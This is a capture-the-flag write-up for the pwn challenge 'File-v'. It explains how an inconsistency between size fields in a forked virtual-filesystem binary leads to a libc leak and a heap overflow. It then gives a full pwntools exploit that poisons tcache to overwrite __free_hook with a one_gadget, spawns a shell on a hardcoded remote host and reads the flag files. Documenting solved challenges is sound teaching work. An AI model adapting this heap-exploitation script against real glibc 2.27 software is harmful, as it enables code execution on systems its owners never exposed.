# File-v

**Authors**: Peace-Maker, pql

**Tags:** pwn

**Points:** 957 (12 solves)

**Description:** 

> Thanks for using J-DRIVE!!!!

The challenge binary implements a virtual filesystem where you could create and manage
"files" in memory through a console menu smelling like an heap challenge. The process
forked right away and let the child and parent process communicate through local sockets.
The parent process provided the user interface which lets the user explore the virtual
filesystem and send "system calls" through to the child process, which kept the actual
list of virtual files.

#### Overview
After reversing both the parent process, we come to the following vfile struct, which
is created and filled with user provided data in the client itself. So the parent process
always keeps one copy of a "selected" vfile in memory to change the metadata and file content
of before committing it to the child process when asked to.

```c
struct vfile_format
{
  unsigned int total_size; // filename_size + filesize + 25
  unsigned int color_idx;
  unsigned int created_time;
  unsigned int modified_time;
  unsigned int filename_size;
  unsigned int filesize;
  char filename[];
};
```

The client process opens a `flag.v` and `README.md.v` file on start and links it into a global
doubly-linked list where the parent process can append and delete files from. The struct looks
something like this, but we only needed the parent process for our exploit.

```c
struct vfile
{
  struct vfile_format *data;
  struct vfile *prev;
  struct vfile *next;
};
```

You can select and print that `flag.v` file through the client menu, but it only tells you to
get a shell to read the real `flag` file.

#### The Bug
When editing a virtual file's contents, the `total_size` field isn't updated [1] but only the
`filesize` field is [4]. Since the two fields were used in different contexts in the logic,
the inconsistency first allowed us to leak a libc address.

```c
__printf_chk(1LL, "Enter content: ");
new_content = read_line(filesize);
total_size = selected_vfile->total_size;               // [1]
new_content2 = new_content;
new_filestruct = (vfile_format *)malloc(selected_vfile->total_size - selected_vfile->filesize + filesize);   // [2]
memcpy(new_filestruct, selected_vfile, total_size);    // [3]
new_filestruct->modified_time = time(0LL);
filename_size = new_filestruct->filename_size;
new_filestruct->filesize = filesize;                   // [4]
memcpy(&new_filestruct->filename[filename_size + 1], new_content2, filesize);
free(selected_vfile);
free(new_content2);
```

#### The Exploit
When changing the content of an existing file like `flag.v` to some longer value and saving it
to the child process, the `total_size` field is used to determine the size of the struct and
thus truncates it on the child process. After loading the same file again, the smaller `total_size`
is used to `malloc` a buffer for it. Printing the contents of a file uses the larger `filesize` field
and leaks the heap memory after the `vfile_format` struct containing libc addresses.

To turn this into an arbitrary write primitive, we created a file with longer content and correct
large `total_size` set. Then edit the contents again to a smaller value. We `malloc` a smaller
chunk in [2], but still `memcpy` the whole old struct over the smaller buffer. [3]
This allowed us to overflow the heap buffer and into another free tcache chunk we placed there
through some heap fengshui. The target chunk had to be smaller than 0x100 in size, since we'll
use the filename as a trigger which had that size limit.

To actually fix up the `total_size` field after changing the contents we resorted to changing
the filename, since that menu option recalculated and updated the `total_size` to match the
set `filesize`:

```c
total_size = file_data_struct->filesize + new_filename_len + 25;
new_vfile = (vfile_format *)calloc(total_size, 1uLL);
new_vfile->total_size = total_size;
```

Since we're dealing with libc 2.27, which lacks tcache sanity checks, the plan was to plant
`__free_hook` into the `fd` field of a free tcache chunk to let `malloc` return that address
and overwrite it with a magic gadget to get a shell. A lot of the logic used `calloc` to
allocate memory though, which doesn't use the tcache. So many steps of the exploit dance
around this limitation by using the few controllable `malloc` calls repeatedly.

```python
#!/usr/bin/env python3
from pwn import *

# context.terminal = ["terminator", "-e"]

BINARY_NAME = "./file-v-new"
LIBC_NAME = "./libc.so"
REMOTE = ("3.36.184.9", 5555)

context.binary = BINARY_NAME
binary = context.binary
libc = ELF(LIBC_NAME)

EXEC_STR = [binary.path]

PIE_ENABLED = binary.pie

BREAKPOINTS = [int(x, 16) for x in args.BREAK.split(',')] if args.BREAK else []

gdbscript_break = '\n'.join([f"brva {hex(x)}" for x in BREAKPOINTS])

gdbscript = \
        """
        # GDBSCRIPT here
        set follow-fork-mode parent
        continue
        """


def handle():
    
    env = {"LD_PRELOAD": libc.path}
    
    if args.REMOTE:
        return remote(*REMOTE)
    
    elif args.LOCAL:
        if args.GDB:
            p = gdb.debug(EXEC_STR, env=env, gdbscript=gdbscript_break + gdbscript)
        else:
            p = process(EXEC_STR, env=env)
    else:
        error("No argument supplied.\nUsage: python exploit.py (REMOTE|LOCAL) [GDB] [STRACE]") 
    
    # if args.STRACE:
    #     subprocess.Popen([*context.terminal, f"strace -p {p.pid}; cat"])
    #     input("Waiting for enter...")
    
    return p

def recvmenu(l):
    l.recvuntil(b"> ")


def do_create_file(l, filename, filename_len=None):
    recvmenu(l)

    if filename_len == None:
        filename_len = len(filename)

    l.sendline(b'c')
    l.sendlineafter(b"Enter the length of filename:", str(filename_len).encode())
    l.sendlineafter(b"Enter filename: ", filename)

def do_select_file(l, filename):
    recvmenu(l)
    l.sendline(b'b')
    l.sendlineafter(b"Enter filename: ", filename)
    response = l.recvline()
    if response == b'Failed to find the file\n':
        return None
    
    l.recvuntil(b"Filename     \t\t")
    filename = l.recvuntil(b"\nSize         \t\t", drop=True)
    size = l.recvuntil(b"\nCreated  Time\t\t", drop=True)
    created_time = l.recvuntil(b"\nModified Time\t\t", drop=True)
    modified_time = l.recvuntil(b"\n-------------------------------------------------------\n", drop=True)

    return {
        "filename": filename,
        "size": size,
        "created_time": created_time,
        "modified_time": modified_time
    }

def select_do_change_name(l, filename, filename_size=None):
    if filename_size == None:
        filename_size = len(filename)

    recvmenu(l)
    l.sendline(b"1")
    l.sendlineafter(b"Enter the length of filename: ", str(filename_size).encode())
    l.sendafter(b"Enter filename: ", filename)

def select_do_change_content(l, content, content_size=None):

    if content_size == None:
        content_size = len(content)

    recvmenu(l)
    l.sendline(b"4")
    l.sendlineafter(b"Enter the size of content: ", str(content_size).encode())
    l.sendafter(b"Enter content: ", content)

def select_do_get_content(l):
    recvmenu(l)
    l.sendline(b"3")

    results = bytearray(0)

    while True:
        l.recvuntil(b' | ')
        
        bs = l.recvuntil(b'|', drop=True).decode().split(' ')[:-1]

        if len(bs) == 0:
            break

        bs = bytearray(map(lambda x: bytes.fromhex(x)[0], bs))
        results += bs

        l.recvuntil(b'\n')

    return results


def select_do_save_changes(l):
    recvmenu(l)
    l.sendline(b'5')

def select_do_back(l, save=False):
    recvmenu(l)
    l.sendline(b'b')
    n = l.recvn(5)
    # print('=====', n)
    if n == b"Won't":
        if save:
            l.sendline(b'Y')
        else:
            l.sendline(b'N')

def select_do_delete(l):
    recvmenu(l)
    l.sendline(b'd')

def main():
    l = handle()

    l.recvuntil(b"-------------------------- MENU ---------------------------")
    
    file = do_select_file(l, b"flag")
    print(file)

    select_do_change_content(l, b"A"*0x100)
    select_do_save_changes(l)
    select_do_back(l)

    do_select_file(l, b"flag")

    oobr = select_do_get_content(l)
    # print(hexdump(oobr))

    libc_leak = u64(oobr[0xab:0xab+8])
    log.info('libc leak: %#x', libc_leak)
    libc_base = libc_leak - 0x3ec680 # libc.sym._IO_2_1_stderr_
    log.info("libc base: %#x", libc_base)
    libc.address = libc_base

    select_do_back(l)

    do_create_file(l, b'H'*0xc0)
    do_select_file(l, b'H'*0xc0)
    select_do_change_content(l, cyclic(0xc0))
    select_do_change_name(l, b'hi')
    select_do_save_changes(l)
    select_do_change_content(l, b'A'*0x130)
    select_do_back(l)
    log.info('heap groomed')
    
    do_create_file(l, b'meh')
    do_select_file(l, b'meh')
    payload = fit({
        0xd0-39: p64(0x21) + b'/etc/localtime\x00',
        0xf0-39: p64(0xf1) + p64(0),
        0x1e0-39: p64(0x1b1) + p64(0),
        0x390-39: p64(0xf1) + p64(libc.sym.__free_hook),
    }, length=0x400)
    select_do_change_content(l, payload)
    select_do_change_name(l, b'ho')
    select_do_change_content(l, b'B'*(0xd0-25-2-0x10))
    select_do_delete(l)
    log.info('planted free_hook')

    do_select_file(l, b'README.md')
    select_do_change_name(l, b'W'*0xd0)
    select_do_save_changes(l)
    # select_do_back(l)
    # select_do_delete(l)
    one_gadget = libc_base + 0x10a41c # 0x4f3d5 0x4f432
    select_do_change_name(l, p64(one_gadget).ljust(0xe0, b'\x00'))
    log.success('enjoy your shell')
    # select_do_save_changes(l)

    l.sendline(b'id;cat f*;cat /home/ctf/f*')

    l.interactive()


if __name__ == "__main__":
    main()
```